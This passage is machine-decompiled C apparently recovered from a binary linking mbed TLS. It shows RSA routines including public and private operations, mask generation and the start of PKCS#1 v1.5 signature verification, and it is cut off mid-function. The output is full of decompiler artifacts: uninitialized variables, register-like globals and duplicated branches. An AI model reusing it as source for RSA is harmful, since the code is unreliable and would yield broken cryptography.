    g1 = mbedtls_mpi_free((int32_t *)v14);
    g3 = v1;
    int32_t v15;
    return mbedtls_mpi_free((int32_t *)v15);
}

// Address range: 0x804f640 - 0x804f666
int32_t mbedtls_rsa_init(char * a1, int32_t a2, int32_t result) {
    int32_t v1 = (int32_t)a1; // edx
    memset(a1, 0, 43);
    *(int32_t *)(v1 + 164) = a2;
    *(int32_t *)(v1 + 168) = result;
    return result;
}

// Address range: 0x804f667 - 0x804f66f
int32_t function_804f667(int32_t a1) {
    // 0x804f667
    return g7;
}

// Address range: 0x804f670 - 0x804f75f
int32_t mgf_mask(int32_t a1, int32_t * a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = g5; // 0x804f673
    int32_t v2 = g7; // 0x804f674
    int32_t v3 = g3; // 0x804f675
    int32_t v4;
    g3 = &v4;
    int32_t v5 = (int32_t)a2; // esi
    int32_t v6 = g4; // 0x804f686
    g4 = (int32_t)memset((char *)&v4, 0, 16);
    int32_t v7 = 0; // bp-32
    int32_t v8 = g6; // 0x804f697
    int32_t result = mbedtls_md_get_size(*(int32_t *)v5) % 256; // 0x804f6a9
    if (v8 == 0) {
        // 0x804f74b
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result;
    }
    // 0x804f6b5
    g5 = g1;
    g4 = v8;
    int32_t * v9 = (int32_t *)v5;
    // branch -> 0x804f6c0
    while (true) {
        // 0x804f6c0
        g7 = result;
        if (v8 <= result) {
            // if_804f6cc_0_true
            g7 = v8;
            // branch -> after_if_804f6cc_0
        }
        // after_if_804f6cc_0
        mbedtls_md_starts(v9);
        mbedtls_md_update(v9, v6, a1);
        mbedtls_md_update(v9, (int32_t)&v7, 4);
        mbedtls_md_finish(v9, g3);
        int32_t v10 = v8; // ecx
        int32_t v11 = 0; // 0x804f738
        int32_t v12 = v8; // 0x804f738
        if (g7 != 0) {
            int32_t v13 = 0; // 0x804f72c
            char * v14 = (char *)(g5 + v13); // 0x804f72c_0
            *v14 = *v14 ^ *(char *)(g3 + v13);
            int32_t v15 = 1; // 0x804f72f
            // branch -> 0x804f728
            while (v15 != g7) {
                // 0x804f728
                v13 = v15;
                v14 = (char *)(g5 + v13);
                *v14 = *v14 ^ *(char *)(g3 + v13);
                v15++;
                // continue -> 0x804f728
            }
            // 0x804f736
            g5 += v15;
            v11 = v15;
            v12 = v10;
            // branch -> 0x804f738
        }
        int32_t v16 = v12 - v11; // 0x804f738
        g4 = v16;
        int32_t v17;
        int32_t result2 = v17 % 256; // 0x804f73a
        if (v12 == v11) {
            // 0x804f74b
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return result2;
        }
        // 0x804f740
        v8 = v16;
        v17 = 0x1000000 * (result2 + 1) / 0x1000000;
        // branch -> 0x804f6c0
    }
}

// Address range: 0x804f760 - 0x804f7df
int32_t mbedtls_rsa_check_pubkey(int32_t a1) {
    int32_t v1 = g3; // 0x804f766
    g3 = a1;
    int32_t v2 = g7; // 0x804f76c
    int32_t v3 = *(int32_t *)(a1 + 16); // 0x804f76f
    if (v3 == 0) {
        // 0x804f776
        g1 = -0x4200;
        // branch -> 0x804f77b
        // 0x804f77b
        g3 = v1;
        g7 = v2;
        return -0x4200;
    }
    int32_t v4 = *(int32_t *)(a1 + 28); // 0x804f788
    g6 = v4;
    if (v4 == 0 || *(char *)v3 == 1 || *(char *)v4 == 1) {
        // 0x804f776
        g1 = -0x4200;
        // branch -> 0x804f77b
        // 0x804f77b
        g3 = v1;
        g7 = v2;
        return -0x4200;
    }
    int32_t v5 = a1 + 8; // 0x804f799
    g7 = v5;
    int32_t v6;
    if (mbedtls_mpi_bitlen(v5, v6) < 128 || mbedtls_mpi_bitlen(g7, v6) > 0x2000) {
        // 0x804f776
        g1 = -0x4200;
        // branch -> 0x804f77b
        // 0x804f77b
        g3 = v1;
        g7 = v2;
        return -0x4200;
    }
    int32_t v7 = g3 + 20; // 0x804f7b8
    g3 = v7;
    if (mbedtls_mpi_bitlen(v7, v6) < 2) {
        // 0x804f776
        g1 = -0x4200;
        // branch -> 0x804f77b
        // 0x804f77b
        g3 = v1;
        g7 = v2;
        return -0x4200;
    }
    int32_t v8 = mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)g7); // 0x804f7cf
    g6 = v8;
    g1 = 0;
    if (v8 <= 0) {
        // 0x804f77b
        g3 = v1;
        g7 = v2;
        return 0;
    }
    // 0x804f776
    g1 = -0x4200;
    // branch -> 0x804f77b
    // 0x804f77b
    g3 = v1;
    g7 = v2;
    return -0x4200;
}

// Address range: 0x804f7e0 - 0x804f8af
int32_t mbedtls_rsa_public(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g7; // 0x804f7e6
    g7 = a1;
    int32_t v2 = g3; // 0x804f7ec
    int32_t v3;
    g3 = &v3;
    int32_t v4 = g5; // 0x804f7f2
    mbedtls_mpi_init(&v3);
    int32_t v5 = mbedtls_mpi_read_binary(g3, (char *)a2, *(int32_t *)(g7 + 4)); // 0x804f80e
    int32_t v6;
    int32_t result; // 0x804f81c
    int32_t v7; // 0x804f817
    if (v5 != 0) {
        // 0x804f817
        v7 = v5 - 0x4280;
        g1 = v7;
        result = v7;
        // branch -> 0x804f81c
        // 0x804f81c
        mbedtls_mpi_free((int32_t *)g3);
        g1 = result;
        // branch -> 0x804f82a
        // 0x804f82a
        g3 = v2;
        g7 = v1;
        g5 = v4;
        g2 = v6;
        return result;
    }
    int32_t v8 = g7 + 8; // 0x804f838
    g5 = v8;
    int32_t v9 = mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)v8); // 0x804f842
    g6 = v9;
    g1 = -0x4284;
    if (v9 > 0) {
        result = -0x4284;
        // 0x804f81c
        mbedtls_mpi_free((int32_t *)g3);
        g1 = result;
        // branch -> 0x804f82a
        // 0x804f82a
        g3 = v2;
        g7 = v1;
        g5 = v4;
        g2 = v6;
        return result;
    }
    int32_t v10 = g7; // 0x804f852
    int32_t v11 = v10 + 20; // 0x804f866
    g7 = v11;
    int32_t * v12 = (int32_t *)g3;
    int32_t v13 = mbedtls_mpi_exp_mod(v12, v12, v11, g5, (char *)(v10 + 104)); // 0x804f871
    if (v13 != 0) {
        // 0x804f817
        v7 = v13 - 0x4280;
        g1 = v7;
        result = v7;
        // branch -> 0x804f81c
        // 0x804f81c
        mbedtls_mpi_free((int32_t *)g3);
        g1 = result;
        // branch -> 0x804f82a
        // 0x804f82a
        g3 = v2;
        g7 = v1;
        g5 = v4;
        g2 = v6;
        return result;
    }
    int32_t v14 = mbedtls_mpi_write_binary((char *)g3, a3, *(int32_t *)(v10 + 4)); // 0x804f88b
    g1 = v14;
    mbedtls_mpi_free((int32_t *)g3);
    int32_t result2; // 0x804f836_2
    if (v14 == 0) {
        // 0x804f89e
        g1 = 0;
        result2 = 0;
        // branch -> 0x804f82a
    } else {
        int32_t v15 = v14 - 0x4280; // 0x804f8a2
        g1 = v15;
        result2 = v15;
        // branch -> 0x804f82a
    }
    // 0x804f82a
    g3 = v2;
    g7 = v1;
    g5 = v4;
    g2 = v6;
    return result2;
}

// Address range: 0x804f8b0 - 0x804fc9f
int32_t mbedtls_rsa_private(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = a1;
    int32_t v2 = g3; // 0x804f8b9
    int32_t v3;
    g3 = &v3;
    int32_t v4 = g7; // 0x804f8bf
    int32_t v5;
    g7 = &v5;
    int32_t v6 = g5; // 0x804f8c5
    int32_t v7;
    g5 = &v7;
    mbedtls_mpi_init(&v3);
    mbedtls_mpi_init((int32_t *)g7);
    mbedtls_mpi_init((int32_t *)g5);
    int32_t v8 = mbedtls_mpi_read_binary(g3, (char *)a4, *(int32_t *)(a1 + 4)); // 0x804f8f7
    int32_t v9;
    int32_t result; // 0x804f900
    if (v8 != 0) {
        // 0x804f900
        result = v8 - 0x4300;
        g1 = result;
        // branch -> 0x804f905
        // 0x804f905
        g1 = mbedtls_mpi_free((int32_t *)g3);
        g1 = mbedtls_mpi_free((int32_t *)g7);
        mbedtls_mpi_free((int32_t *)g5);
        // branch -> 0x804f923
        // 0x804f923
        g3 = v2;
        g7 = v4;
        g5 = v6;
        g2 = v9;
        return result;
    }
    int32_t v10 = a1 + 8; // 0x804f936
    int32_t v11 = mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)v10); // 0x804f940
    g6 = v11;
    g1 = -0x4304;
    int32_t result3; // 0x804f905
    if (v11 <= 0) {
        // 0x804f950
        int32_t v12; // 0x804fa32
        int32_t v13; // 0x804fa6a
        int32_t v14; // 0x804fa53
        int32_t v15; // 0x804fa8b
        int32_t v16; // 0x804faa3
        int32_t v17; // 0x804fac1
        int32_t v18; // 0x804fadc
        int32_t v19; // 0x804faf7
        int32_t v20; // 0x804fb0f
        int32_t v21; // 0x804fb35
        int32_t v22; // 0x804fb50
        int32_t v23; // 0x804fb71
        int32_t result2; // 0x804f92f_2
        int32_t * v24;
        int32_t v25; // 0x804f900
        int32_t v26; // 0x804fb96
        int32_t v27; // 0x804fa28
        int32_t v28; // 0x804fa60
        int32_t v29; // 0x804fb45
        if (a2 != 0) {
            // 0x804f95b
            int32_t v30; // 0x804fbbb
            int32_t v31; // 0x804f9fe
            int32_t v32; // 0x804fa19
            int32_t v33;
            int32_t * v34;
            int32_t v35; // 0x804fa0e
            if (*(int32_t *)(v1 + 160) == 0) {
                int32_t v36 = v1 + 152; // 0x804fba8
                v30 = v1 + 140;
                int32_t v37 = v1; // 0x804fbce
                int32_t v38 = 1; // 0x804fc3045
                // branch -> 0x804fbc4
                while (true) {
                    // 0x804fbc4
                    g6 = v37;
                    int32_t v39 = *(int32_t *)(v37 + 4); // 0x804fbd5
                    int32_t v40 = mbedtls_mpi_fill_random(v36, v39 - 1, (int32_t (*)(int32_t, int32_t, int32_t))a2, a3); // 0x804fbe5
                    if (v40 == 0) {
                        int32_t v41 = mbedtls_mpi_gcd(v30, v36, v10); // 0x804fc06
                        if (v41 == 0) {
                            // 0x804fc13
                            if (mbedtls_mpi_cmp_int(v30, 1) == 0) {
                                int32_t v42 = mbedtls_mpi_inv_mod(v30, v36, v10); // 0x804fc4d
                                g6 = v30;
                                if (v42 == 0) {
                                    int32_t * v43 = (int32_t *)v30;
                                    v33 = mbedtls_mpi_exp_mod(v43, v43, v1 + 20, v10, (char *)(v1 + 104));
                                    // branch -> 0x804f9eb
                                    // 0x804f9eb
                                    g6 = v30;
                                    if (v33 == 0) {
                                        // 0x804f9f3
                                        v34 = (int32_t *)g3;
                                        v31 = mbedtls_mpi_mul_mpi(v34, v34, (int32_t *)v30);
                                        if (v31 == 0) {
                                            // 0x804fa0b
                                            v35 = g3;
                                            v32 = mbedtls_mpi_mod_mpi(v35, v35, v10);
                                            if (v32 == 0) {
                                                // 0x804fa28
                                                v27 = v1;
                                                v12 = v27 + 44;
                                                v14 = mbedtls_mpi_exp_mod((int32_t *)g7, (int32_t *)g3, v27 + 68, v12, (char *)(v27 + 116));
                                                if (v14 == 0) {
                                                    // 0x804fa60
                                                    v28 = v1;
                                                    v13 = v28 + 56;
                                                    v15 = mbedtls_mpi_exp_mod((int32_t *)g5, (int32_t *)g3, v28 + 80, v13, (char *)(v28 + 128));
                                                    if (v15 == 0) {
                                                        // 0x804fa98
                                                        v16 = mbedtls_mpi_sub_mpi((int32_t *)g3, (int32_t *)g7, (int32_t *)g5);
                                                        if (v16 == 0) {
                                                            // 0x804fab0
                                                            v17 = mbedtls_mpi_mul_mpi((int32_t *)g7, (int32_t *)g3, (int32_t *)(v1 + 92));
                                                            if (v17 == 0) {
                                                                // 0x804face
                                                                v18 = mbedtls_mpi_mod_mpi(g3, g7, v12);
                                                                if (v18 == 0) {
                                                                    // 0x804fae9
                                                                    v19 = mbedtls_mpi_mul_mpi((int32_t *)g7, (int32_t *)g3, (int32_t *)v13);
                                                                    if (v19 == 0) {
                                                                        // 0x804fb04
                                                                        v20 = mbedtls_mpi_add_mpi((int32_t *)g3, (int32_t *)g5, (int32_t *)g7);
                                                                        if (v20 == 0) {
                                                                            // 0x804fb1c
                                                                            if (a2 == 0) {
                                                                                // 0x804fb5d
                                                                                v23 = mbedtls_mpi_write_binary((char *)g3, a5, *(int32_t *)(v1 + 4));
                                                                                g1 = v23;
                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                mbedtls_mpi_free((int32_t *)g5);
                                                                                g6 = v23;
                                                                                v26 = v23 - 0x4300;
                                                                                g4 = v26;
                                                                                if (v23 != 0) {
                                                                                    // if_804fb9e_0_true
                                                                                    result2 = v26;
                                                                                    // branch -> 0x804f923
                                                                                } else {
                                                                                    result2 = 0;
                                                                                }
                                                                                // 0x804f923
                                                                                g3 = v2;
                                                                                g7 = v4;
                                                                                g5 = v6;
                                                                                g2 = v9;
                                                                                return result2;
                                                                            }
                                                                            // 0x804fb22
                                                                            v24 = (int32_t *)g3;
                                                                            v21 = mbedtls_mpi_mul_mpi(v24, v24, (int32_t *)(v1 + 152));
                                                                            v25 = v21;
                                                                            if (v21 == 0) {
                                                                                // 0x804fb42
                                                                                v29 = g3;
                                                                                v22 = mbedtls_mpi_mod_mpi(v29, v29, v10);
                                                                                if (v22 == 0) {
                                                                                    // 0x804fb5d
                                                                                    v23 = mbedtls_mpi_write_binary((char *)g3, a5, *(int32_t *)(v1 + 4));
                                                                                    g1 = v23;
                                                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                    mbedtls_mpi_free((int32_t *)g5);
                                                                                    g6 = v23;
                                                                                    v26 = v23 - 0x4300;
                                                                                    g4 = v26;
                                                                                    if (v23 != 0) {
                                                                                        // if_804fb9e_0_true
                                                                                        result2 = v26;
                                                                                        // branch -> 0x804f923
                                                                                    } else {
                                                                                        result2 = 0;
                                                                                    }
                                                                                    // 0x804f923
                                                                                    g3 = v2;
                                                                                    g7 = v4;
                                                                                    g5 = v6;
                                                                                    g2 = v9;
                                                                                    return result2;
                                                                                }
                                                                                v25 = v22;
                                                                            }
                                                                            // 0x804f900
                                                                            result = v25 - 0x4300;
                                                                            g1 = result;
                                                                            // branch -> 0x804f905
                                                                            // 0x804f905
                                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                            mbedtls_mpi_free((int32_t *)g5);
                                                                            // branch -> 0x804f923
                                                                            // 0x804f923
                                                                            g3 = v2;
                                                                            g7 = v4;
                                                                            g5 = v6;
                                                                            g2 = v9;
                                                                            return result;
                                                                        }
                                                                        v25 = v20;
                                                                    } else {
                                                                        v25 = v19;
                                                                    }
                                                                } else {
                                                                    v25 = v18;
                                                                }
                                                            } else {
                                                                v25 = v17;
                                                            }
                                                        } else {
                                                            v25 = v16;
                                                        }
                                                    } else {
                                                        v25 = v15;
                                                    }
                                                } else {
                                                    v25 = v14;
                                                }
                                            } else {
                                                v25 = v32;
                                            }
                                        } else {
                                            v25 = v31;
                                        }
                                    } else {
                                        v25 = v33;
                                    }
                                } else {
                                    v25 = v42;
                                }
                            } else {
                                // 0x804fc2a
                                if (v38 == 11) {
                                    // 0x804fc8c
                                    // branch -> 0x804f900
                                    // 0x804f900
                                    result = -0x8780;
                                    g1 = result;
                                    // branch -> 0x804f905
                                    // 0x804f905
                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                    mbedtls_mpi_free((int32_t *)g5);
                                    // branch -> 0x804f923
                                    // 0x804f923
                                    g3 = v2;
                                    g7 = v4;
                                    g5 = v6;
                                    g2 = v9;
                                    return result;
                                }
                                // 0x804fc30
                                v37 = v1;
                                v38++;
                                // branch -> 0x804fbc4
                                continue;
                            }
                            // 0x804f900
                            result = v25 - 0x4300;
                            g1 = result;
                            // branch -> 0x804f905
                            // 0x804f905
                            g1 = mbedtls_mpi_free((int32_t *)g3);
                            g1 = mbedtls_mpi_free((int32_t *)g7);
                            mbedtls_mpi_free((int32_t *)g5);
                            // branch -> 0x804f923
                            // 0x804f923
                            g3 = v2;
                            g7 = v4;
                            g5 = v6;
                            g2 = v9;
                            return result;
                        }
                        v25 = v41;
                    } else {
                        v25 = v40;
                    }
                }
            } else {
                int32_t v44 = v1 + 140; // 0x804f96f
                int32_t * v45 = (int32_t *)v44;
                int32_t v46 = mbedtls_mpi_mul_mpi(v45, v45, v45); // 0x804f983
                g6 = v44;
                if (v46 == 0) {
                    int32_t v47 = mbedtls_mpi_mod_mpi(v44, v44, v10); // 0x804f9a1
                    if (v47 == 0) {
                        int32_t v48 = v1 + 152; // 0x804f9b1
                        int32_t * v49 = (int32_t *)v48;
                        int32_t v50 = mbedtls_mpi_mul_mpi(v49, v49, v49); // 0x804f9c5
                        g4 = v48;
                        if (v50 == 0) {
                            // 0x804f9d5
                            v33 = mbedtls_mpi_mod_mpi(v48, v48, v10);
                            v30 = v44;
                            // branch -> 0x804f9eb
                            // 0x804f9eb
                            g6 = v30;
                            if (v33 == 0) {
                                // 0x804f9f3
                                v34 = (int32_t *)g3;
                                v31 = mbedtls_mpi_mul_mpi(v34, v34, (int32_t *)v30);
                                if (v31 == 0) {
                                    // 0x804fa0b
                                    v35 = g3;
                                    v32 = mbedtls_mpi_mod_mpi(v35, v35, v10);
                                    if (v32 == 0) {
                                        // 0x804fa28
                                        v27 = v1;
                                        v12 = v27 + 44;
                                        v14 = mbedtls_mpi_exp_mod((int32_t *)g7, (int32_t *)g3, v27 + 68, v12, (char *)(v27 + 116));
                                        if (v14 == 0) {
                                            // 0x804fa60
                                            v28 = v1;
                                            v13 = v28 + 56;
                                            v15 = mbedtls_mpi_exp_mod((int32_t *)g5, (int32_t *)g3, v28 + 80, v13, (char *)(v28 + 128));
                                            if (v15 == 0) {
                                                // 0x804fa98
                                                v16 = mbedtls_mpi_sub_mpi((int32_t *)g3, (int32_t *)g7, (int32_t *)g5);
                                                if (v16 == 0) {
                                                    // 0x804fab0
                                                    v17 = mbedtls_mpi_mul_mpi((int32_t *)g7, (int32_t *)g3, (int32_t *)(v1 + 92));
                                                    if (v17 == 0) {
                                                        // 0x804face
                                                        v18 = mbedtls_mpi_mod_mpi(g3, g7, v12);
                                                        if (v18 == 0) {
                                                            // 0x804fae9
                                                            v19 = mbedtls_mpi_mul_mpi((int32_t *)g7, (int32_t *)g3, (int32_t *)v13);
                                                            if (v19 == 0) {
                                                                // 0x804fb04
                                                                v20 = mbedtls_mpi_add_mpi((int32_t *)g3, (int32_t *)g5, (int32_t *)g7);
                                                                if (v20 == 0) {
                                                                    // 0x804fb1c
                                                                    if (a2 == 0) {
                                                                        // 0x804fb5d
                                                                        v23 = mbedtls_mpi_write_binary((char *)g3, a5, *(int32_t *)(v1 + 4));
                                                                        g1 = v23;
                                                                        g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                        g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                        mbedtls_mpi_free((int32_t *)g5);
                                                                        g6 = v23;
                                                                        v26 = v23 - 0x4300;
                                                                        g4 = v26;
                                                                        if (v23 != 0) {
                                                                            // if_804fb9e_0_true
                                                                            result2 = v26;
                                                                            // branch -> 0x804f923
                                                                        } else {
                                                                            result2 = 0;
                                                                        }
                                                                        // 0x804f923
                                                                        g3 = v2;
                                                                        g7 = v4;
                                                                        g5 = v6;
                                                                        g2 = v9;
                                                                        return result2;
                                                                    }
                                                                    // 0x804fb22
                                                                    v24 = (int32_t *)g3;
                                                                    v21 = mbedtls_mpi_mul_mpi(v24, v24, (int32_t *)(v1 + 152));
                                                                    v25 = v21;
                                                                    if (v21 == 0) {
                                                                        // 0x804fb42
                                                                        v29 = g3;
                                                                        v22 = mbedtls_mpi_mod_mpi(v29, v29, v10);
                                                                        if (v22 == 0) {
                                                                            // 0x804fb5d
                                                                            v23 = mbedtls_mpi_write_binary((char *)g3, a5, *(int32_t *)(v1 + 4));
                                                                            g1 = v23;
                                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                            mbedtls_mpi_free((int32_t *)g5);
                                                                            g6 = v23;
                                                                            v26 = v23 - 0x4300;
                                                                            g4 = v26;
                                                                            if (v23 != 0) {
                                                                                // if_804fb9e_0_true
                                                                                result2 = v26;
                                                                                // branch -> 0x804f923
                                                                            } else {
                                                                                result2 = 0;
                                                                            }
                                                                            // 0x804f923
                                                                            g3 = v2;
                                                                            g7 = v4;
                                                                            g5 = v6;
                                                                            g2 = v9;
                                                                            return result2;
                                                                        }
                                                                        v25 = v22;
                                                                    }
                                                                    // 0x804f900
                                                                    result = v25 - 0x4300;
                                                                    g1 = result;
                                                                    // branch -> 0x804f905
                                                                    // 0x804f905
                                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                    mbedtls_mpi_free((int32_t *)g5);
                                                                    // branch -> 0x804f923
                                                                    // 0x804f923
                                                                    g3 = v2;
                                                                    g7 = v4;
                                                                    g5 = v6;
                                                                    g2 = v9;
                                                                    return result;
                                                                }
                                                                v25 = v20;
                                                            } else {
                                                                v25 = v19;
                                                            }
                                                        } else {
                                                            v25 = v18;
                                                        }
                                                    } else {
                                                        v25 = v17;
                                                    }
                                                } else {
                                                    v25 = v16;
                                                }
                                            } else {
                                                v25 = v15;
                                            }
                                        } else {
                                            v25 = v14;
                                        }
                                    } else {
                                        v25 = v32;
                                    }
                                } else {
                                    v25 = v31;
                                }
                            } else {
                                v25 = v33;
                            }
                        } else {
                            v25 = v50;
                        }
                    } else {
                        v25 = v47;
                    }
                } else {
                    v25 = v46;
                }
            }
            // 0x804f900
            result = v25 - 0x4300;
            g1 = result;
            // branch -> 0x804f905
            // 0x804f905
            g1 = mbedtls_mpi_free((int32_t *)g3);
            g1 = mbedtls_mpi_free((int32_t *)g7);
            mbedtls_mpi_free((int32_t *)g5);
            // branch -> 0x804f923
            // 0x804f923
            g3 = v2;
            g7 = v4;
            g5 = v6;
            g2 = v9;
            return result;
        }
        // 0x804fa28
        v27 = v1;
        v12 = v27 + 44;
        v14 = mbedtls_mpi_exp_mod((int32_t *)g7, (int32_t *)g3, v27 + 68, v12, (char *)(v27 + 116));
        if (v14 == 0) {
            // 0x804fa60
            v28 = v1;
            v13 = v28 + 56;
            v15 = mbedtls_mpi_exp_mod((int32_t *)g5, (int32_t *)g3, v28 + 80, v13, (char *)(v28 + 128));
            if (v15 == 0) {
                // 0x804fa98
                v16 = mbedtls_mpi_sub_mpi((int32_t *)g3, (int32_t *)g7, (int32_t *)g5);
                if (v16 == 0) {
                    // 0x804fab0
                    v17 = mbedtls_mpi_mul_mpi((int32_t *)g7, (int32_t *)g3, (int32_t *)(v1 + 92));
                    if (v17 == 0) {
                        // 0x804face
                        v18 = mbedtls_mpi_mod_mpi(g3, g7, v12);
                        if (v18 == 0) {
                            // 0x804fae9
                            v19 = mbedtls_mpi_mul_mpi((int32_t *)g7, (int32_t *)g3, (int32_t *)v13);
                            if (v19 == 0) {
                                // 0x804fb04
                                v20 = mbedtls_mpi_add_mpi((int32_t *)g3, (int32_t *)g5, (int32_t *)g7);
                                if (v20 == 0) {
                                    // 0x804fb1c
                                    if (a2 == 0) {
                                        // 0x804fb5d
                                        v23 = mbedtls_mpi_write_binary((char *)g3, a5, *(int32_t *)(v1 + 4));
                                        g1 = v23;
                                        g1 = mbedtls_mpi_free((int32_t *)g3);
                                        g1 = mbedtls_mpi_free((int32_t *)g7);
                                        mbedtls_mpi_free((int32_t *)g5);
                                        g6 = v23;
                                        v26 = v23 - 0x4300;
                                        g4 = v26;
                                        if (v23 != 0) {
                                            // if_804fb9e_0_true
                                            result2 = v26;
                                            // branch -> 0x804f923
                                        } else {
                                            result2 = 0;
                                        }
                                        // 0x804f923
                                        g3 = v2;
                                        g7 = v4;
                                        g5 = v6;
                                        g2 = v9;
                                        return result2;
                                    }
                                    // 0x804fb22
                                    v24 = (int32_t *)g3;
                                    v21 = mbedtls_mpi_mul_mpi(v24, v24, (int32_t *)(v1 + 152));
                                    v25 = v21;
                                    if (v21 == 0) {
                                        // 0x804fb42
                                        v29 = g3;
                                        v22 = mbedtls_mpi_mod_mpi(v29, v29, v10);
                                        if (v22 == 0) {
                                            // 0x804fb5d
                                            v23 = mbedtls_mpi_write_binary((char *)g3, a5, *(int32_t *)(v1 + 4));
                                            g1 = v23;
                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                            mbedtls_mpi_free((int32_t *)g5);
                                            g6 = v23;
                                            v26 = v23 - 0x4300;
                                            g4 = v26;
                                            if (v23 != 0) {
                                                // if_804fb9e_0_true
                                                result2 = v26;
                                                // branch -> 0x804f923
                                            } else {
                                                result2 = 0;
                                            }
                                            // 0x804f923
                                            g3 = v2;
                                            g7 = v4;
                                            g5 = v6;
                                            g2 = v9;
                                            return result2;
                                        }
                                        v25 = v22;
                                    }
                                    // 0x804f900
                                    result = v25 - 0x4300;
                                    g1 = result;
                                    // branch -> 0x804f905
                                    // 0x804f905
                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                    mbedtls_mpi_free((int32_t *)g5);
                                    // branch -> 0x804f923
                                    // 0x804f923
                                    g3 = v2;
                                    g7 = v4;
                                    g5 = v6;
                                    g2 = v9;
                                    return result;
                                }
                                v25 = v20;
                            } else {
                                v25 = v19;
                            }
                        } else {
                            v25 = v18;
                        }
                    } else {
                        v25 = v17;
                    }
                } else {
                    v25 = v16;
                }
            } else {
                v25 = v15;
            }
        } else {
            v25 = v14;
        }
        // 0x804f900
        result = v25 - 0x4300;
        g1 = result;
        result3 = result;
        // branch -> 0x804f905
    } else {
        result3 = -0x4304;
    }
    // 0x804f905
    g1 = mbedtls_mpi_free((int32_t *)g3);
    g1 = mbedtls_mpi_free((int32_t *)g7);
    mbedtls_mpi_free((int32_t *)g5);
    // branch -> 0x804f923
    // 0x804f923
    g3 = v2;
    g7 = v4;
    g5 = v6;
    g2 = v9;
    return result3;
}

// Address range: 0x804fca0 - 0x804ff5f
int32_t mbedtls_rsa_rsassa_pkcs1_v15_verify(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, int32_t n, int32_t str2, int32_t a8) {
    int32_t v1;
    char v2 = v1;
    g6 = a4;
    int32_t v3 = g3; // 0x804fcac
    int32_t v4 = (int32_t)a1;
    g4 = a8;
    int32_t v5; // 0x804fd9c
    int32_t v6; // 0x804fe05
    int32_t v7; // 0x804ff4c
    int32_t v8; // 0x804fcd2_0
    int32_t v9; // 0x804fd58_0
    int32_t v10; // 0x804fdd6_0
    int32_t v11; // 0x804fe02_0
    int32_t v12; // 0x804fe70_0
    int32_t v13; // 0x804fde4
    int32_t v14; // 0x804fdf7
    int32_t v15; // 0x804fe8f
    int32_t result2; // 0x804ff0a
    int32_t memcmp_rc; // 0x804ff39
    int32_t result; // esi
    int32_t str;
    int32_t v16;
    int32_t v17;
    int32_t v18;
    int32_t v19;
    int32_t v20;
    int32_t v21;
    int32_t v22;
    int32_t v23;
    int32_t v24; // 0x804fe5a
    int32_t v25; // 0x804fcc3
    int32_t v26; // 0x804fcc0
    int32_t n2; // 0x804ff19
    int32_t str3; // 0x804ff22
    int32_t v27; // 0x804fd62
    if (a4 != 1) {
        // 0x804fcc0
        v26 = *(int32_t *)(v4 + 4);
        g3 = v26;
        v25 = v26 - 16;
        g7 = v25;
        if (v25 > 1008) {
            // 0x804fd0a
            result = -0x4080;
            // branch -> 0x804fd0f
        } else {
            // 0x804fcce
            v8 = &v17;
            g5 = v8;
            if (a4 == 0) {
                // 0x804fcd2
                v23 = mbedtls_rsa_public(v4, a8, v8);
                // branch -> 0x804fcea
            } else {
                // 0x804fd20
                v23 = mbedtls_rsa_private(v4, (int32_t)a2, a3, a8, v8);
                // branch -> 0x804fcea
            }
            // 0x804fcea
            result = v23;
            if (v23 == 0) {
                // 0x804fcee
                if (v17 % 256 == 0) {
                    // 0x804fd48
                    if (v2 == 1) {
                        // 0x804fd51
                        v9 = &v16;
                        g6 = v9;
                        if (v16 % 256 != 0) {
                            // 0x804fd62
                            v27 = g5 - 1 + g3;
                            g4 = v27;
                            if (v27 > v9) {
                                // 0x804fd6a
                                // branch -> 0x804fcf7
                            }
                            // 0x804fcf7
                            // branch -> 0x804fd0f
                            // 0x804fd0f
                            g3 = v3;
                            return -0x4100;
                        }
                        // 0x804fd97
                        v10 = &str;
                        g6 = n;
                        v5 = g3 + g5 - v10;
                        v19 = v10;
                        if (v5 == n) {
                            // 0x804fdab
                            if (a5 == 0) {
                                // 0x804fdb1
                                g4 = str2;
                                if (memcmp((char *)&str, (char *)str2, n) != 0) {
                                    // 0x804fdcc
                                    result = -0x4380;
                                    // branch -> 0x804fd0f
                                }
                                // 0x804fd0f
                                g3 = v3;
                                return result;
                            }
                        }
                        // 0x804fdde
                        v13 = mbedtls_md_info_from_type(a5);
                        if (v13 == 0) {
                            // 0x804fd0a
                            result = -0x4080;
                            // branch -> 0x804fd0f
                        } else {
                            // 0x804fdf1
                            g7 = &v19;
                            v14 = mbedtls_md_get_size(v13);
                            v11 = &v18;
                            v6 = v19 + v5;
                            g3 = v6;
                            g5 = v14;
                            if (mbedtls_asn1_get_tag((int32_t *)g7, v6, v11, 48) == 0) {
                                // 0x804fe26
                                if (v18 + 2 == v5) {
                                    // 0x804fe34
                                    if (mbedtls_asn1_get_tag((int32_t *)g7, g3, v11, 48) == 0) {
                                        // 0x804fe57
                                        v24 = g5 % 256;
                                        g5 = v24;
